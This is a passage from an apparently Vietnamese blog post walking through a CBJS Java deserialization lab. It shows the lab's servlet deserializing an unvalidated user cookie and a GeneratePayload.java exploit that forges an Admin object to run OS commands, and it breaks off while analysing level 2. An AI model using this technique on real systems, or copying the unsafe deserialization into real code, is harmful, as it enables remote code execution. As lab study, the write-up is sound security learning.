<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java Deserialize CBJS Lab | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể l">
<meta property="og:type" content="article">
<meta property="og:title" content="Java Deserialize CBJS Lab">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-10-15-CBJS-Java-Deserialize/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể l">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2025-11-14T19:34:38.235Z">
<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Java Deserialize CBJS Lab",
  "url": "https://pzhat.github.io/2025/11/15/2025-10-15-CBJS-Java-Deserialize/",
  "image": "https://pzhat.github.io/img/butterfly-icon.png",
  "datePublished": "2025-11-14T19:34:38.235Z",
  "dateModified": "2025-10-24T05:38:35.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-10-15-CBJS-Java-Deserialize/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java Deserialize CBJS Lab',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Java Deserialize CBJS Lab</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Java Deserialize CBJS Lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.235Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Java-Deserialize-CBJS-Lab"><a href="#Java-Deserialize-CBJS-Lab" class="headerlink" title="Java Deserialize CBJS Lab"></a>Java Deserialize CBJS Lab</h1><h3 id="Giai-thich-chi-tiet-ve-lo-hong-Deserialization"><a href="#Giai-thich-chi-tiet-ve-lo-hong-Deserialization" class="headerlink" title="Giải thích chi tiết về lỗ hổng Deserialization"></a>Giải thích chi tiết về lỗ hổng Deserialization</h3><p><strong>1. Deserialization là gì?</strong></p>
<ul>
<li><p>Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).</p>
</li>
<li><p>Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.</p>
</li>
</ul>
<p><strong>2. Nguyên nhân</strong><br> Lỗ hổng xảy ra khi:</p>
<ul>
<li>Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network).</li>
<li>Không có validation&#x2F;filtering đầu vào Attacker có thể kiểm soát nội dung được deserialize.</li>
<li>Quá trình deserialization tự động thực thi code trong object</li>
</ul>
<p><strong>3. Tác động</strong></p>
<ul>
<li>Remote Code Execution (RCE): Thực thi mã độc từ xa.</li>
<li>Authentication bypass: Vượt qua xác thực.</li>
<li>Privilege escalation: Leo thang đặc quyền.</li>
<li>Denial of Service (DoS): Làm sập hệ thống.</li>
<li>SQL Injection: Thông qua object manipulation.</li>
<li></li>
</ul>
<p><strong>4. Các ngôn ngữ bị ảnh hưởng</strong></p>
<ul>
<li>Java (ObjectInputStream)</li>
<li>PHP (unserialize)</li>
<li>Python (pickle)</li>
<li>.NET (BinaryFormatter)</li>
<li>Ruby (Marshal)</li>
</ul>
<h3 id="Exploit-and-POC"><a href="#Exploit-and-POC" class="headerlink" title="Exploit and POC"></a>Exploit and POC</h3><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1:"></a>Level 1:</h3><p><img src="https://hackmd.io/_uploads/BkWdaEspel.png" alt="image"></p>
<p>Level 1 đưa ta đến với 1 giao diện khá là đơn giản khi không có gì ngoài dòng Hello Servlet để trỏ đến trang khác bây giờ mình sẽ thử click vào để xem thử ra cái gì.</p>
<p><img src="https://hackmd.io/_uploads/HJid6VsTeg.png" alt="image"></p>
<p>Nó trả về cho ta 1 dòng là <code>Hello Guest</code> còn lại không có gì bây giờ ta sẽ thử với burpsuite xem thử quá trình request sẽ có những gì xảy ra.</p>
<p><img src="https://hackmd.io/_uploads/H1Tztshpxl.png" alt="image"></p>
<p>Request có vẻ không đưa ra nhiều thông tin cần thiết cho ta nhưng ta để ý rằng có user cookie khá là đáng ngờ trong trường hợp này.</p>
<p>Level 1 bao gồm 3 class chính đó là : </p>
<ul>
<li>HelloServlet.java</li>
<li>User.java</li>
<li>Admin.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;Guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ở class user có 1 thuộc tính là name và method <code>getName()</code> để trả về giá trị name.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Admin</span> <span class="keyword">extends</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String getNameCMD;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Admin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.getNameCMD = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="built_in">this</span>.getNameCMD);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">            <span class="keyword">return</span> stdInput.readLine();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Đây là class admin nó sẽ kế thừa class User và có thêm 1 thuộc tính là <code>getNameCMD</code> trả về kết quả của <code>whoami</code>, sau đó là hàm <code>toString</code> và đây cũng là một magic method của java.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="comment">// Get list of cookie</span></span><br><span class="line">            Map&lt;String, String&gt; cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));</span><br><span class="line">            <span class="comment">// Check is user cookie has already set</span></span><br><span class="line">            User user;</span><br><span class="line">            <span class="keyword">if</span> (!cookieMap.containsKey(<span class="string">&quot;user&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;user&quot;</span>, serializeToBase64(user));</span><br><span class="line">                response.addCookie(cookie);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    user = (User)deserializeFromBase64(cookieMap.get(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;Please don&#x27;t hack me&quot;</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;Level 1 Hello &quot;</span> + user + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            out.println(<span class="string">&quot;Something went wrong&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>Đến với class <code>HelloServlet.java</code> thì đây là phần xử lý logic chính của cả bài ở đây nó sẽ thực hiện deserialize cookie để lấy được giá trị của User nhưng trong trường hợp không tồn tại cookie của user thì nó sẽ tạo một cookie mới và đưa lại xử lý như cũ.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">serializeToBase64</span><span class="params">(Serializable obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(output.toByteArray());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Hàm ở đây có <code>writeObject()</code> là hàm serialize của java.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBase64</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(s);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span>  <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Sau đó sẽ là hàm deserialize với method là <code>readObject()</code>.</p>
<p>Sau khi phân tích ta thấy ở đoạn hàm <code>doGet()</code> ở đó có một dòng:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out.println(<span class="string">&quot;&lt;h1&gt;Level 1 Hello &quot;</span> + user + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>Ở đây là một đoạn ghép chuỗi và nó đã gọi đến hàm toString() và kích hoạt magic method đó, khi mà <code>toString()</code> được kích hoạt thì nó sẽ gọi đến câu OS command là <code>whoami</code> và trả về kết quả sau khi thực thi đó.</p>
<p>Đó sẽ là cái sink để ta có thể khai thác ta sẽ đi theo hướng exploit để có thể tạo ra một cái cookie đúng theo cấu trúc nhưng khác ở đây là ta có thể thay đổi được nội dung sau khi serialize theo ý thích của mình việc còn lại chỉ cần inject cookie mới vào để nó deserialize ra bây giờ ta sẽ đi đến với bước code exploit.</p>
<p>Với code exploit ta sẽ giữ lại hầu như các function các class sẵn có để có thể tạo thành gadget đúng theo ý mình và đúng theo cách hoạt động của web app.</p>
<p><img src="https://hackmd.io/_uploads/r1923jhaee.png" alt="image"></p>
<p>Tại <code>Admin.java</code> mình tiến hành thay đổi câu lệnh whoami thành <code>id</code> để khi nó gọi đến toString thì thay vì gọi cmd là whoami bây giờ nó sẽ trả về giá trị sau khi thực thi câu lệnh id.</p>
<p><img src="https://hackmd.io/_uploads/H12UTi2aee.png" alt="image"></p>
<p>Tại đây vì sử dụng class Admin nên ta sẽ thay đổi <code>User user = new User()</code> sang <code>User user = new Admin()</code> để cho đúng với cấu trúc.</p>
<p>Sau đó viết một class <code>GeneratePayload.java</code> có nội dung: </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Đang chuẩn bị tạo payload...&quot;</span>);</span><br><span class="line">            <span class="type">Admin</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Generate payload object: &quot;</span> + payloadObject);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">            objectOutputStream.writeObject(payloadObject);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">byte</span>[] serializedBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serializedBytes);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;\n--- Complete! ---&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Cookie:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line">            System.out.println(base64Payload);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Đã có lỗi xảy ra!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Code này sẽ giúp in ra user cookie sau khi mình ghép các gadget lại với nhau tạo ra user cookie đã được sửa thành payload.</p>
<p><img src="https://hackmd.io/_uploads/B1oPCjnTex.png" alt="image"></p>
<p>Thành công gen ra được payload bây giờ ta sẽ thử thay thế vào xem kết quả.</p>
<p><img src="https://hackmd.io/_uploads/Hyap0j3aeg.png" alt="image"></p>
<p>Thành công thực thi câu lệnh id bây giờ ta hoàn toàn có thể RCE web theo ý muốn.</p>
<p><img src="https://hackmd.io/_uploads/H1cjlh3Txx.png" alt="image"></p>
<p>Debug ở đây cho ta thấy bây giờ giá trị đúng là id vậy nên ta đã hoàn toàn khai thác được level này.</p>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2:"></a>Level 2:</h3><p><img src="https://hackmd.io/_uploads/Skwxqh26ex.png" alt="image"></p>
<p>Về bên ngoài thì có vẻ như level 2 cũng không quá khác biệt với level 1 vẫn chỉ là chức năng như chỉ là chương trình có thêm chức năng kiểm tra HTTP Connection bằng cách sử dụng os command ping và curl.</p>
<p><img src="https://hackmd.io/_uploads/BJmN033peg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/By2zi2hagx.png" alt="image"></p>
<p>Đến với source code của level 2 ta thấy rằng có 3 class mới gồm:</p>
<ul>
<li>HTTPConnection.java</li>
<li>MyHTTPClient.java</li>
<li>MyRequestServlet.java</li>
</ul>
<p>Còn lại thì nó vẫn giống như level 1 bây giờ ta sẽ thử đọc đoạn code đã gọi đến magic method giống level trước để xem cái sink có còn tồn tại hay không.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.message = <span class="string">&quot;Level 2 Hello &quot;</span> + user.getName();</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            out.println(<span class="string">&quot;Something went wrong&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>Ở đây ta để ý rằng phần cộng chuỗi bây giờ đã bị thay đổi thành user.getName() là gọi thẳng function thay vì gọi toString như ở level 1 nên không có magic method ở đây để tạo sink nữa nó sẽ lấy thẳng user name thẳng từ trong <code>User.java</code> luôn.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span 